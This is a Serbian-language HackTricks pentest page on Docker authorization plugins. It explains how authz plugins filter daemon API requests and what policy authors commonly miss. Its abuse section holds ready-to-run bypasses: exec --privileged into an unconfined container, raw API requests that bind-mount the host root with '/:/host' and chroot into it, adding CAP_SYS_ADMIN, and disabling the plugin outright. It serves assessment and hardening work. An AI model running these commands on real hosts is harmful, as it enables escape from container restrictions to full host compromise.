# Runtime autorizacioni pluginovi

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Runtime autorizacioni pluginovi predstavljaju dodatni sloj politike koji odlučuje da li pozivalac može da izvrši određenu akciju daemona. Docker je klasičan primer. Po defaultu, svako ko može da komunicira sa Docker daemon-om praktično ima široku kontrolu nad njim. Autorizacioni pluginovi pokušavaju da suze taj model tako što proveravaju autentifikovanog korisnika i traženu API operaciju, pa onda dozvoljavaju ili odbijaju zahtev u skladu sa politikom.

Ova tema zaslužuje posebnu stranicu jer menja model eksploatacije kada napadač već ima pristup Docker API-ju ili korisniku u `docker` grupi. U takvim okruženjima pitanje više nije samo "mogu li da dođem do daemona?" već i "da li je daemon ograđen autorizacionim slojem, i ako jeste, može li se taj sloj zaobići kroz neobrađene endpoint-e, slabu JSON parsiranje, ili permisije za upravljanje pluginovima?"

## Operacija

Kada zahtev stigne do Docker daemona, autorizacioni subsistem može proslediti kontekst zahteva jednom ili više instaliranih plugina. Plugin vidi identitet autentifikovanog korisnika, detalje zahteva, izabrane header-e, i delove request ili response tela kada je content type pogodan. Više plugina može biti lančano povezano, i pristup se odobrava samo ako svi plugini dozvole zahtev.

Ovaj model zvuči čvrsto, ali njegova bezbednost u potpunosti zavisi od toga koliko je autor politike u potpunosti razumeo API. Plugin koji blokira `docker run --privileged` ali ignoriše `docker exec`, propusti alternativne JSON ključeve kao što je top-level `Binds`, ili dozvoljava administraciju plugina može stvoriti lažni osećaj ograničenja dok i dalje ostavlja otvorene direktne puteve za eskalaciju privilegija.

## Uobičajene mete pluginova

Važne oblasti za pregled politike su:

- endpointi za kreiranje container-a
- `HostConfig` polja kao što su `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, i opcije deljenja namespace-a
- ponašanje `docker exec`
- endpointi za upravljanje pluginovima
- bilo koji endpoint koji može indirektno pokrenuti runtime akcije van zamišljenog modela politike

Istorijski primeri kao što su Twistlock's `authz` plugin i jednostavni edukativni pluginovi poput `authobot` učinili su ovaj model lakim za proučavanje jer su njihovi policy fajlovi i kodni putevi pokazivali kako je mapiranje endpoint-a na akcije zapravo implementirano. Za procenu, važna lekcija je da autor politike mora da razume punu API površinu, a ne samo najvidljivije CLI komande.

## Zloupotreba

Prvi cilj je da se sazna šta je zapravo blokirano. Ako daemon odbije akciju, greška često leaks ime plugina, što pomaže da se identifikuje kontrola u upotrebi:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Ako vam treba opsežnije endpoint profiling, alati poput `docker_auth_profiler` su korisni, jer automatizuju inače ponavljajući zadatak proveravanja koje API rute i JSON strukture su zaista dozvoljene od strane plugina.

Ako okruženje koristi prilagođeni plugin i možete da komunicirate sa API-jem, enumerišite koja polja objekta su zaista filtrirana:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ove provere su važne jer su mnogi neuspehi autorizacije specifični za polja, a ne za koncepte. Plugin može odbiti CLI obrazac bez potpunog blokiranja ekvivalentne API strukture.

### Potpun primer: `docker exec` dodaje privilegije nakon kreiranja kontejnera

Politika koja blokira kreiranje privilegovanih kontejnera, ali dozvoljava kreiranje neograničenih kontejnera i `docker exec`, i dalje se može zaobići:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Ako daemon prihvati drugi korak, korisnik je povratio privilegovani interaktivni proces unutar container-a za koji je autor politike smatrao da je ograničen.

### Potpun primer: Bind Mount Through Raw API

Neke neispravne politike proveravaju samo jedan JSON oblik. Ako root filesystem bind mount nije dosledno blokiran, host se i dalje može mount-ovati:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Ista ideja se takođe može pojaviti pod `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Posledica je potpuni host filesystem escape. Zanimljiv detalj je da bypass proizilazi iz nepotpune pokrivenosti politike, a ne iz kernel bug.

### Potpun primer: Neproveren capability atribut

Ako politika zaboravi da filtrira atribut vezan za capability, napadač može da kreira container koji ponovo dobija opasnu capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Kada je prisutna `CAP_SYS_ADMIN` ili neka slična snažna capability, mnoge breakout techniques opisane u [capabilities.md](protections/capabilities.md) i [privileged-containers.md](privileged-containers.md) postaju dostupne.

### Kompletan primer: Onemogućavanje plugina

Ako su dozvoljene plugin-management operacije, najčistiji bypass može biti potpuno isključivanje kontrole:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Ovo je neuspeh politike na nivou kontrolne ravni. Sloj autorizacije postoji, ali korisnik kojeg je trebalo ograničiti i dalje ima dozvolu da ga onemogući.

## Provere

Ove komande imaju za cilj da identifikuju da li sloj politike postoji i da li izgleda potpun ili površan.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
- Poruke o odbijanju koje uključuju naziv plugina potvrđuju postojanje sloja autorizacije i često otkrivaju tačnu implementaciju.
- Lista plugina vidljiva napadaču može biti dovoljna da otkrije da li su moguće operacije onemogućavanja ili rekonfiguracije.
- Politika koja blokira samo očigledne CLI akcije, ali ne i raw API zahteve, treba se smatrati zaobilažljivom dok se ne dokaže suprotno.

## Podrazumevana ponašanja runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Nije omogućen podrazumevano | Pristup daemona je u praksi sve-ili-ništa osim ako nije konfigurisana authorization plugin | nekompletna plugin politika, blacklists umesto allowlists, dozvoljavanje plugin management-a, field-level blind spots |
| Podman | Nije uobičajen direktan ekvivalent | Podman se obično više oslanja na Unix permissions, rootless execution i odluke o izlaganju API nego na Docker-style authz plugins | široko izlaganje rootful Podman API, slabe socket permissions |
| containerd / CRI-O | Drugi model kontrole | Ovi runtimes obično se oslanjaju na socket permissions, node trust boundaries i kontrole orkestratora na višem nivou, umesto na Docker authz plugins | montiranje socketa u workloads, slabe pretpostavke poverenja na nivou čvora |
| Kubernetes | Koristi authn/authz na slojevima API-servera i kubeleta, ne Docker authz plugins | Cluster RBAC i admission controls su glavni sloj politike | preširok RBAC, slaba admission politika, direktno izlaganje kubelet ili runtime API-ja |
{{#include ../../../banners/hacktricks-training.md}}
